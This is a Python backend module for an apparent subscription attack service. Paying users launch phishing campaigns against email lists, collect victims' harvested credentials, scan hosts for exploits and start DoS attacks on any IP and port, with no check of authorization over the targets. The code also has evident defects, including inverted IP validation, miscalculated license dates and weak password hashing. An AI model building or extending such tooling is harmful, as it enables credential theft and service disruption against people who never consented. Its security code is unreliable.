import re
import hashlib
import os
import time
import secrets
import socket
import json
import struct
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
import string
import random
from datetime import timedelta
from Cryptodome.Cipher import AES
import os
from _thread import *
import CreditCard
from PyPhisher import pyphisher
from phishing import Phishing
from SQL_ORM import Connection
from Scanners.VulnerabilityScanner import VulnScanner
from DOSKit import DOS

__author__ = "SimuSecLTD"

BUFFER  = 1024
DB = Connection()
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def generate_and_send_key(sock: socket.socket):
    import server

    key = os.urandom(16)
    iv = os.urandom(16)

    sock.send(key)
    sock.send(iv)

    server.TEMP_KEYS.update({sock: {"key": key, "iv": iv}})
    print(server.TEMP_KEYS)

    return key, iv

def encrypt(msg: str, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(msg, AES.block_size))


    return ciphertext

def decrypt(encrypted_message: str, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    try:
        padded_message = cipher.decrypt(encrypted_message)
        decrypted_message = unpad(padded_message, AES.block_size)

    except Exception as e:
        print(e)

    return decrypted_message
    
def get_item_from_json(item: str, email: str):
    with open(f"{BASE_DIR}/PyPhisher/files/saved_info.json", "r") as f:
        data = json.load(f)
    
    return data[email][item]

def add_user_to_saved_info_json(email):
    with open(f"{BASE_DIR}/PyPhisher/files/saved_info.json", "r") as f:
        data = json.load(f)

    with open(f"{BASE_DIR}/PyPhisher/files/saved_info.json", "w") as f:
        data.update({email: {"ips": [], "credentials": [], "amount": 1}})
        json.dump(data, f, indent=2)

def add_user_to_scans_json(email):
    with open(f"{BASE_DIR}/Scanners/scans.json", "r") as f:
        data = json.load(f)

    with open(f"{BASE_DIR}/Scanners/scans.json", "w") as f:
        data.update({email: {"exploits": [], "status": 0}})
        json.dump(data, f, indent=2)

def add_user_to_dos_json(email):
    with open(f"{BASE_DIR}/dos_attacks.json", "r") as f:
        data = json.load(f)

    with open(f"{BASE_DIR}/dos_attacks.json", "w") as f:
        data.update({email: {"scans": []}})
        json.dump(data, f, indent=2)

def generate_salt():
    return secrets.token_urlsafe(20)

def hash_and_salt_password(plain_text: str, salt):
    if len(salt) == 1:
        salt = salt[0]
        
    password = plain_text + salt

    # Create a SHA-256 hash object
    sha256_hash = hashlib.sha256()

    # Convert the password string to bytes and update the hash object
    sha256_hash.update(password.encode('utf-8'))

    # Get the hexadecimal representation of the hash digest
    hashed_password = sha256_hash.hexdigest()

    return hashed_password

def start_values_phish_json(email, amount):
    with open(f"{BASE_DIR}/PyPhisher/files/saved_info.json", "r+") as f:
        data = json.load(f)

        data[email]["ips"] = []
        data[email]["credentials"] = []
        data[email]["amount"] = amount

    with open(f"{BASE_DIR}/PyPhisher/files/saved_info.json", "w") as f:
        json.dump(data, f, indent=2)

def start_values_scan_json(email):
    with open(f"{BASE_DIR}/Scanners/scans.json", "r+") as f:
        data = json.load(f)

        data[email]["exploits"] = []
        data[email]["status"] = 0

    with open(f"{BASE_DIR}/Scanners/scans.json", "w") as f:
        json.dump(data, f, indent=2)


def recv_length(sock: socket.socket):
    length_str = sock.recv(4).decode()
    length     = int(length_str)
    print(length)
    return length

def decrypt_string_from_bytes(key, iv, encrypted_data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(encrypted_data)
    unpadded_data = unpad(decrypted_data, AES.block_size)
    return unpadded_data.decode()

import io

def recv(sock: socket.socket):
    key, iv = get_key_and_iv(sock)
    
    try:
        stream = io.BytesIO()
        length_bytes = sock.recv(4)
        length = int.from_bytes(length_bytes, byteorder='little')

        chunk = sock.recv(length)
        stream.write(chunk)

        encrypted_message = stream.getvalue()
        print(f"Received encrypted message: {encrypted_message}")
        message = DecryptStringFromBytes(encrypted_message, key, iv)
        
        unpadded = unpad_pkcs7(message)
        print(f"Decrypted message: {unpadded}")

        return unpadded.split(":::")
    except:
        print("User disconnection...")

        

import struct

def pad_message(message: str) -> bytes:
    padding_length = AES.block_size - len(message) % AES.block_size
    padding = bytes([padding_length] * padding_length)
    return message.encode() + padding

def DecryptStringFromBytes(encryptedMessage, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    paddedMessage = cipher.decrypt(encryptedMessage)
    unpaddedMessage = unpad_message(paddedMessage)
    return unpaddedMessage.decode('utf-8')

def unpad_message(padded_message):
    padding_length = padded_message[-1]
    return padded_message[:-padding_length]

def unpad_pkcs7(padded_data):
    pad_len = ord(padded_data[-1])
    return padded_data[:-pad_len]

def encrypt_message(message, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_message = pad_message(message)
    encrypted_message = cipher.encrypt(padded_message)
    return encrypted_message

def decrypt_message(encrypted_message, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_message = cipher.decrypt(encrypted_message)
    return decrypted_message.decode()

def send_length(sock: socket.socket, msg: str):
    length = len(msg)
    packed_length = struct.pack('!i', length)
    sock.sendall(packed_length)

def pack_by_protocol(args: list):
    full_str = ""

    for arg in args:
        full_str += str(arg) + ":::"
    
    return full_str[:-3:]



def send(sock: socket.socket, msg: str):
    key, iv = get_key_and_iv(sock)

    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_message = pad(msg.encode(), AES.block_size)
    ciphertext = cipher.encrypt(padded_message)
    payload = ciphertext
    sock.send(len(payload).to_bytes(4, byteorder='big'))
    sock.send(payload)

def get_key_and_iv(sock: socket.socket):
    import server

    key = server.TEMP_KEYS[sock]["key"]
    iv = server.TEMP_KEYS[sock]["iv"]

    return key, iv

def split_data(data: str):
    return data.split(":::")

def current_unixtime_as_int() -> int:
    current_time = int(time.time()) # Time in seconds since the epoch (Unix Time)

    return current_time

def unix_time_add(amount):
    current_time = current_unixtime_as_int()
    time_plus_month = current_time + timedelta(days=amount).total_seconds()
    return int(time_plus_month)

def validateEmail(username: str):
    # Gmail username regex pattern
    pattern = re.compile("^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$")

    # Check if the username matches the pattern
    if pattern.match(username):
        return "OK"
    else:
        return "NO"

def validatePassword(password: str):
    # Password regex pattern (minimum 8 characters, 1 uppercase, 1 lowercase, 1 digit)
    pattern = re.compile("^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[a-zA-Z\d]{8,}$")

    # Check if the password matches the pattern
    if pattern.match(password):
        return "OK"
    else:
        return "NO"



def verify_password(email_given, password_given: str, password_hash: str):
    salt = DB.get_user_salt(email_given) # Get user's salt
    
    new_password_salted_hash = hash_and_salt_password(password_given, salt)

    if new_password_salted_hash == password_hash:
        return True
    return False

def credential_validation_process(email: str, password: str):
    # Test the email and the password
    email_validation_res = validateEmail(email)
    passw_validation_res = validatePassword(password)

    if not(passw_validation_res == "OK" 
       and email_validation_res == "OK"):
            return "NO:::ERROR" # Add implementation to errors later
    
    return f"OK:::{email}:::{password}"

def verify_license(license_end_date: int):
    return (license_end_date - current_unixtime_as_int()) > 0

def validate_user_for_login(email: str, password: str):
    if not DB.user_exists(email):
        return "NO"
    else:
        all_values = DB.get_user_creds(email)

        # all values should return a 3 value tuple of (str, str, int)
        email_found       = all_values[0]
        password_found    = all_values[1]
        license_end_found = all_values[2]

        # Email and password should be the same, validate the hash and a valid license
        if email == email_found and verify_password(email_found, password, password_found)\
                                and verify_license(license_end_found):
            return "OK"

        return "NO"

def login(sock: socket.socket, data):
    email, passw = data[0], data[1]

    ver_res = credential_validation_process(email, passw)

    splitted_res = split_data(ver_res)

    ver_code = splitted_res[0]

    if ver_code == "OK":
        email = splitted_res[1]
        passw = splitted_res[2]

        validation_code = validate_user_for_login(email, passw)

        if validation_code == "OK":
            send(sock, "OK")
            import server
            server.CONNECTED_USERS.update({sock: email})
            print(server.CONNECTED_USERS)
        
        else:
            send(sock, "User does not exist")
    else:
        send(sock, "Email or password wrong format")

def signup(sock, data):
    email, passw = data[0], data[1]

    ver_res = credential_validation_process(email, passw)

    splitted_res = split_data(ver_res)

    ver_code = splitted_res[0]

    if ver_code == "OK":
        email = splitted_res[1]
        passw = splitted_res[2]

        if DB.user_exists(email): 
            send(sock, "User already exists")
        else:
            send(sock, "OK")

            salt = generate_salt()
            # Adding user to the database
            DB.add_user((email, hash_and_salt_password(passw, salt),
                        unix_time_add(30)), salt)
            
            add_user_to_saved_info_json(email)
            add_user_to_scans_json(email)
            add_user_to_dos_json(email)

    else:
        send(sock, "User not valid")

def get_payment_creds_from_client(data):
    # recv the card info from the client
    email                = data[0]
    amount               = data[1]
    card_holder_name     = data[2]
    card_number          = data[3]
    card_expiration_date = data[4]
    card_cvv             = data[5]

    # return the data
    return email, amount, card_holder_name, card_number,\
           card_expiration_date, card_cvv

def recv_payment(sock: socket.socket, data):
    email, amount, card_holder_name, card_number,\
    card_expiation_date, card_cvv\
    = get_payment_creds_from_client(data)
    
    is_valid_email = DB.user_exists(email)
    is_valid = CreditCard.is_valid_card_info(card_number,card_holder_name,
                                             card_expiation_date, card_cvv)
    
    if is_valid and is_valid_email: 
        send(sock, "OK")
        creds = DB.get_user_creds(email)
        license_end_found = creds[2]

        new_date = get_new_license_date(amount, license_end_found)

        DB.update_license_date(email, new_date)

    else: send(sock, "Card or email not valid")

def get_new_license_date(amount, license_end_found):
    if amount == "$5.99":
        days = 30
    elif amount == "$24.99":
        days = 180 
    else: 
        days = 365

    if current_unixtime_as_int() > license_end_found:
        new_license_end = current_unixtime_as_int() + unix_time_add(days)
    else:
        new_license_end = license_end_found + unix_time_add(days)
    
    return new_license_end

def get_email_list_from_format(emails_formatted: str):
    emails_formatted = emails_formatted.strip(" ")
    emails_list = emails_formatted.split(",")

    return emails_list

def phishing(sock: socket.socket, data):
    to_addr   = data[0]
    service   = data[1]

    emails_list = get_email_list_from_format(to_addr)

    for email in emails_list:
        if validateEmail(email) == False:
            send(sock, "One email might be wrong")
            return
        else:
            send(sock, "OK")
    
    from server import CONNECTED_USERS

    try:
        start_values_phish_json(CONNECTED_USERS[sock], amount=len(emails_list))
        pyphisher.main_menu(service, CONNECTED_USERS[sock], emails_list)
        send(sock, "OK")
    except Exception as e:
        print(e)
        send(sock, "Something went wrong...")
        return

def logout(sock: socket.socket):
    import server

    server.CONNECTED_USERS.pop(sock)
    sock.close()

def get_scan_status_as_str(email):
    with open(f"{BASE_DIR}/Scanners/scans.json", "r") as f:
        data = json.load(f)

    return str(data[email]["status"])

def get_dos_current(email):
    with open(f"{BASE_DIR}/dos_attacks.json") as f:
        data = json.load(f)

        scans = data[email]["scans"]
        if len(scans) > 0:
            return scans[-1]
        return None

def get_dos_percent(scan: str):
    if scan is None: return 0
    splitted = scan.split(":::")

    status  = splitted[3]
    percent = splitted[2]

    if status == "0":
        return 0
    return percent

def home(sock: socket.socket):
    from server import CONNECTED_USERS

    email = CONNECTED_USERS[sock]
    creds_wanted_amount_in_str = str(get_item_from_json("amount", email))
    creds_found_amount_in_str = str(len(get_item_from_json("credentials", email)))
    dos_percent = get_dos_percent(get_dos_current(email))
    

    packed_msg = pack_by_protocol([f"{creds_wanted_amount_in_str}", f"{creds_found_amount_in_str}",
                                   get_scan_status_as_str(email), dos_percent])
    
    send(sock, packed_msg)

def scan(sock: socket.socket, data):
    from server import CONNECTED_USERS

    email = CONNECTED_USERS[sock]

    host = data[0]
    scanner = VulnScanner(host)
    start_new_thread(scanner.scan, (email, ))

def scan_stats(sock: socket.socket):
    import server

    email = server.CONNECTED_USERS[sock]
    with open(f"{BASE_DIR}/Scanners/scans.json", "r") as f:
        data = json.load(f)
        exploits = data[email]["exploits"]
        amount = len(exploits)
        print(exploits)
        send(sock, str(amount))
    
    for exploit in exploits:
        print(exploit)
        splitted = exploit.split("\n")
        service     = splitted[0]
        type        = splitted[1]
        cve         = splitted[2]
        severity    = splitted[3]
        description = splitted[4]

        packed_msg = pack_by_protocol([service, type, cve, severity, description])
        send(sock, packed_msg)

def split_creds_by_protocol(creds: str):
    splitted = creds.split('~')
    return ':::'.join(splitted)

def phishing_stats(sock: socket.socket):
    from server import CONNECTED_USERS

    email = CONNECTED_USERS[sock]
    creds_found_amount_in_str = str(len(get_item_from_json("credentials", email)))
    
    packed_msg = pack_by_protocol([creds_found_amount_in_str])
    
    send(sock, packed_msg)

    with open(f"{BASE_DIR}/PyPhisher/files/saved_info.json", 'r') as f:
        data = json.load(f)

        creds = data[email]["credentials"]

        print(creds)

        for cred in creds:
            all_creds=split_creds_by_protocol(cred)
            send(sock, all_creds)

def add_to_dos_json(email, scan):
    with open(f"{BASE_DIR}/dos_attacks.json", "r") as f:
        data = json.load(f)

    with open(f"{BASE_DIR}/dos_attacks.json", "w") as f:
        scans = data[email]["scans"]
        
        if scan[-1] == '0':
            scans.append(scan)
        else: scans[-1] = scan
        data.update({email: {"scans": scans}})
        json.dump(data, f, indent=2)

def is_ok_ip(ip: str):
    fields = ip.split(".")
    if len(fields) != 4:
        return False

    for field in fields:
        if 0> int(field) or 255 > int(field):
            return False
    
    return True
    


def dos(sock: socket.socket, data: list):
    ip = data[0]
    if not is_ok_ip(ip):
        send(sock, "Bad IP")
        return

    port=data[1]


    from server import CONNECTED_USERS

    email = CONNECTED_USERS[sock]
    atk = DOS(ip, port, email)
    
    print(ip, port)
    connection_status = atk.connect() # Initialize connection to the router via UDP
    print(connection_status)
    if  connection_status != "OK":
        send(sock, "Could'nt connect")
        return

    last_atk = get_dos_current(email)
    if last_atk is not None:
        if last_atk[-1] == 0:
            send(sock, "There is an ongoing attack")
        else:
            send(sock, "OK")


    src = f"{ip}:::{port}::: :::0"
    add_to_dos_json(email, src)

    start_new_thread(atk.exploit, ())

def dos_stats(sock: socket.socket):
    from server import CONNECTED_USERS

    email = CONNECTED_USERS[sock]

    with open(f"{BASE_DIR}/dos_attacks.json", "r") as f:
        data = json.load(f)
    
    scans = data[email]["scans"]
    amount = str(len(scans))

    send(sock, amount)
    for scan in scans:
        splitted = scan.split(":::")

        ip      = splitted[0]
        port    = splitted[1]
        percent = splitted[2]
        status  = splitted[3]

        to_send = pack_by_protocol([ip, port, percent, status])
        send(sock, to_send)


def act_by_action(action: str, data: list, sock: socket.socket): # What to do based on the action given by Client
    if action == "LOGIN":
        login(sock, data)

    elif action == "SIGNUP":
        signup(sock, data)
    
    elif action == "PAY":
        recv_payment(sock, data)

    elif action == "PHISHING":
        phishing(sock, data)
    
    elif action == "HOME":
        home(sock)

    elif action == "SCAN":
        scan(sock, data)

    elif action == "SCAN_STATS":
        scan_stats(sock)

    elif action == "PHISH_STATS":
        phishing_stats(sock)

    elif action == "DOS":
        dos(sock, data)

    elif action == "DOS_STATS":
        dos_stats(sock) 

    else:
        print(f"Action: {action}, not found")
